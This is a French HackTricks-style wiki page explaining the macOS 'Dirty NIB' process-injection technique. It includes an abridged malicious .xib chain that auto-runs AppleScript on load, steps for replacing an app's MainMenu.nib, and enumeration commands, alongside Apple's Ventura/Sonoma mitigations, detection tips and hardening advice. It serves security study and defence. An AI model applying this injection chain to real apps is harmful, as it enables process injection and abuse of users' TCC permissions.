# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB désigne l’exploitation de fichiers Interface Builder (.xib/.nib) à l’intérieur d’un bundle d’application macOS signé afin d’exécuter une logique contrôlée par l’attaquant au sein du processus cible, héritant ainsi de ses entitlements et de ses permissions TCC. Cette technique a été documentée à l’origine par xpn (MDSec), puis généralisée et considérablement étendue par Sector7, qui a également présenté les mitigations d’Apple dans macOS 13 Ventura et macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Pour le contexte et des analyses approfondies, consultez les références à la fin.

> TL;DR
> • Avant macOS 13 Ventura : le remplacement du MainMenu.nib d’un bundle (ou d’un autre nib chargé au démarrage) permettait de manière fiable d’effectuer une injection de processus et souvent une privilege escalation.
> • Depuis macOS 13 (Ventura), avec des améliorations dans macOS 14 (Sonoma) : la vérification approfondie au premier lancement, la protection des bundles, les Launch Constraints et la nouvelle permission TCC « App Management » empêchent en grande partie la modification de nib après le lancement par des applications sans lien. Les attaques peuvent toutefois rester réalisables dans des cas particuliers (par exemple, des outils du même développeur modifiant ses propres applications, ou des terminaux auxquels l’utilisateur a accordé App Management/Full Disk Access).

## Que sont les fichiers NIB/XIB

Les fichiers Nib (abréviation de NeXT Interface Builder) sont des graphes d’objets UI sérialisés utilisés par les applications AppKit. Les versions modernes de Xcode stockent les fichiers XML .xib modifiables, qui sont compilés en .nib lors du build. Une application classique charge son UI principale via `NSApplicationMain()`, qui lit la clé `NSMainNibFile` du fichier Info.plist de l’application et instancie le graphe d’objets lors de l’exécution.

Points clés permettant l’attaque :
- Le chargement d’un NIB instancie des classes Objective-C arbitraires sans exiger qu’elles soient conformes à NSSecureCoding (le nib loader d’Apple utilise `init`/`initWithFrame:` comme solution de repli lorsque `initWithCoder:` n’est pas disponible).
- Cocoa Bindings peut être utilisé abusivement pour appeler des méthodes pendant l’instanciation des nibs, notamment des appels chaînés ne nécessitant aucune interaction de l’utilisateur.


## Processus d’injection Dirty NIB (vue de l’attaquant)

Le flux classique avant Ventura :
1) Créer un .xib malveillant
- Ajouter un objet `NSAppleScript` (ou d’autres classes « gadget » telles que `NSTask`).
- Ajouter un `NSTextField` dont le titre contient le payload (par exemple, un AppleScript ou des arguments de commande).
- Ajouter un ou plusieurs objets `NSMenuItem` reliés via des bindings afin d’appeler des méthodes sur l’objet cible.

2) Déclencher automatiquement sans clic de l’utilisateur
- Utiliser des bindings pour définir la target/selector d’un menu item, puis appeler la méthode privée `_corePerformAction` afin que l’action soit exécutée automatiquement lors du chargement du nib. Cela supprime la nécessité pour l’utilisateur de cliquer sur un bouton.

Exemple minimal d’une chaîne auto-trigger à l’intérieur d’un .xib (abrégé par souci de clarté) :
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Cela permet l’exécution arbitraire d’AppleScript dans le processus cible lors du chargement du nib.<sup>[[1]](#references)</sup> Les chaînes avancées peuvent :
- Instancier des classes AppKit arbitraires (p. ex. `NSTask`) et appeler des méthodes sans argument comme `-launch`.
- Appeler des selectors arbitraires avec des arguments objet via l’astuce de binding ci-dessus.
- Charger `AppleScriptObjC.framework` pour faire le pont avec Objective-C et même appeler certaines API C.
- Sur les anciens systèmes qui incluent encore `Python.framework`, faire le pont avec Python, puis utiliser `ctypes` pour appeler des fonctions C arbitraires (recherche de Sector7).<sup>[[2]](#references)</sup>

3) Remplacer le nib de l’application
- Copier target.app vers un emplacement accessible en écriture, remplacer par exemple `Contents/Resources/MainMenu.nib` par le nib malveillant, puis exécuter target.app. Avant Ventura, après une évaluation unique par Gatekeeper, les lancements suivants n’effectuaient que des vérifications superficielles de signature ; les ressources non exécutables (comme `.nib`) n’étaient donc pas revalidées.

Exemple de payload AppleScript pour un test visible :
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Protections modernes de macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple a introduit plusieurs mesures d’atténuation systémiques qui réduisent considérablement la viabilité de Dirty NIB dans les versions modernes de macOS :<sup>[[2]](#references)</sup>
- Vérification approfondie au premier lancement et protection des bundles (macOS 13 Ventura)
- Lors de la première exécution de toute application (qu’elle soit mise en quarantaine ou non), une vérification approfondie de la signature couvre toutes les ressources du bundle. Ensuite, le bundle devient protégé : seules les applications du même développeur (ou explicitement autorisées par l’application) peuvent modifier son contenu. Les autres applications nécessitent la nouvelle permission TCC « App Management » pour écrire dans le bundle d’une autre application.
- Launch Constraints (macOS 13 Ventura)
- Les applications système/intégrées à macOS ne peuvent pas être copiées ailleurs puis exécutées ; cela neutralise l’approche « copier vers /tmp, modifier, exécuter » pour les applications du système d’exploitation.
- Améliorations dans macOS 14 Sonoma
- Apple a renforcé App Management et corrigé des bypass connus (par exemple, CVE‑2023‑40450) signalés par Sector7. Python.framework avait été supprimé auparavant (macOS 12.3), ce qui a cassé certaines chaînes d’escalade de privilèges.
- Modifications de Gatekeeper/Quarantine
- Pour une discussion plus large de Gatekeeper, de la provenance et des changements d’évaluation qui ont affecté cette technique, consultez la page référencée ci-dessous.

> Implication pratique
> • Sur Ventura et les versions ultérieures, vous ne pouvez généralement pas modifier le fichier .nib d’une application tierce, à moins que votre processus ne dispose de la permission App Management ou ne soit signé avec le même Team ID que la cible (par exemple, avec des outils de développement).
> • Accorder les permissions App Management ou Full Disk Access aux shells/terminaux réouvre effectivement cette surface d’attaque pour tout code pouvant s’exécuter dans le contexte de ce terminal.


### Addressing Launch Constraints

Les Launch Constraints empêchent l’exécution de nombreuses applications Apple depuis des emplacements non par défaut à partir de Ventura. Si vous utilisiez des workflows antérieurs à Ventura, comme copier une application Apple dans un répertoire temporaire, modifier `MainMenu.nib` puis la lancer, attendez-vous à ce que cela échoue sur les versions >= 13.0.


## Énumération des cibles et des nibs (utile pour la recherche / les systèmes legacy)

- Localiser les applications dont l’interface utilisateur est pilotée par des nibs :
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Trouver des ressources nib candidates à l’intérieur d’un bundle :
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Validez les signatures de code en profondeur (échouera si vous avez altéré les ressources sans re-signer) :
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Note : Sur les versions modernes de macOS, vous serez également bloqué par la protection des bundles/TCC lorsque vous tenterez d’écrire dans le bundle d’une autre application sans autorisation appropriée.


## Conseils de détection et de DFIR

- Surveillance de l’intégrité des fichiers des ressources des bundles
- Surveillez les changements de mtime/ctime de `Contents/Resources/*.nib` et des autres ressources non exécutables des applications installées.
- Unified logs et comportement des processus
- Surveillez l’exécution inattendue d’AppleScript au sein des applications GUI, ainsi que les processus chargeant AppleScriptObjC ou Python.framework. Exemple :
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Évaluations proactives
- Exécutez régulièrement `codesign --verify --deep` sur les applications critiques afin de vérifier que leurs ressources restent intactes.
- Contexte des privilèges
- Auditez qui ou quoi dispose des permissions TCC « App Management » ou Full Disk Access (en particulier les terminaux et les agents de gestion). Supprimer ces permissions des shells généralistes empêche de réactiver trivialement une falsification de type Dirty NIB.


## Renforcement défensif (développeurs et défenseurs)

- Préférez une UI programmatique ou limitez ce qui est instancié depuis les nibs. Évitez d’inclure des classes puissantes (par ex. `NSTask`) dans les graphes de nibs et évitez les bindings qui invoquent indirectement des selectors sur des objets arbitraires.
- Adoptez le hardened runtime avec Library Validation (déjà standard pour les applications modernes). Bien que cela n’empêche pas l’injection de nibs à lui seul, cela bloque le chargement facile de code natif et contraint les attaquants à utiliser des payloads uniquement basés sur le scripting.
- Ne demandez pas de permissions App Management étendues dans les outils généralistes et n’en dépendez pas. Si un MDM nécessite App Management, séparez ce contexte des shells contrôlés par l’utilisateur.
- Vérifiez régulièrement l’intégrité du bundle de votre application et faites en sorte que vos mécanismes de mise à jour réparent automatiquement les ressources du bundle.


## Lectures connexes dans HackTricks

Apprenez-en davantage sur Gatekeeper, la quarantaine et les changements de provenance qui affectent cette technique :

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Références

- [1] [xpn – DirtyNIB (write-up original avec exemple Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 avril 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
